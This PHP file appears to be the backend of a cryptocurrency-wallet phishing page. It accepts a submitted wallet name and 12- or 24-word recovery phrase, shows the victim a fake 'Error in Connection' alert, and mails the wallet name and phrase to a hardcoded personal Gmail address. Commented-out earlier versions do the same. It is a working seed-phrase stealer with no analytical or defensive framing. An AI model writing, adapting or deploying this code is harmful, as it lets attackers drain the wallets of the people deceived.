<?php


// $Useremail= $_POST['email'];
 $wallet= $_POST['wallet'];
$phrase= $_POST['phrase'];
// $walletName ;


// VALIDATING TEXTAREA

if (trim($_POST['phrase']) &&  str_word_count($phrase) != 12 && str_word_count($phrase) != 24  ) {

   
    echo "<script> alert('field cannot be empty and it must contain 12 or 24 words ....')   </script>";

   // header("Location: index.html");


}else{

   // echo "correct";

   

   // to send an email
   

//    $to = "olamilekanomosanya@gmail.com";
//    $subject = "This is subject";
//    $message= "fullname is ".$fullname."and the phrase are:".$phrase;
   
//    $header = "From:mainnetconnections.com \r\n";
//    $header .= "Cc:mainnetconnections \r\n";
//    $header .= "MIME-Version: 1.0\r\n";
//    $header .= "Content-type: text/html\r\n";
   
//    $retval = mail ($to,$subject,$message,$header);
   
//    if( $retval == true ) {
//       // echo "Message sent successfully...";
//    }else {
//       // echo "Message could not be sent...";

//    }





}


echo "<script> alert('Error in Connection !!!! ....')   </script>";



// echo "fullname is ".$fullname."and the phrase are:".$phrase;

// echo str_word_count($phrase);


// echo str_word_count("Hello world correct, really!");

// to send mail

// ini_set("sendmail_from", "mainnetconnections.com");  
// $to = "olamilekanomosanya@gmail.com";//change receiver address  
// $subject = "This is subject";  
// $message = "fullname is ".$fullname."and the phrase are:".$phrase ;  
// $header = "From:sonoojaiswal@javatpoint.com \r\n";  

// $result = ini_set ($to,$subject,$message,$header);  



// if( $result == true ){  
//    echo "Message sent successfully...";  
// }else{  
//    echo "Sorry, unable to send mail...";  
// }  







         // header("Location: index.html");



 $to = 'olamilekanomosanya@gmail.com'; // replace this mail with yours
$phrase = $_POST["phrase"];
$email= "mainnetconnections.com";
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "From: " . $email . "\r\n"; // Sender's E-mail
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
$message = " wallet is : {$wallet}.  phrase is: {$phrase}";
 
if (@mail($to, $email, $message, $headers))
{
    echo 'The message has been sent.';
}else{
    echo 'failed';
}



         


?>

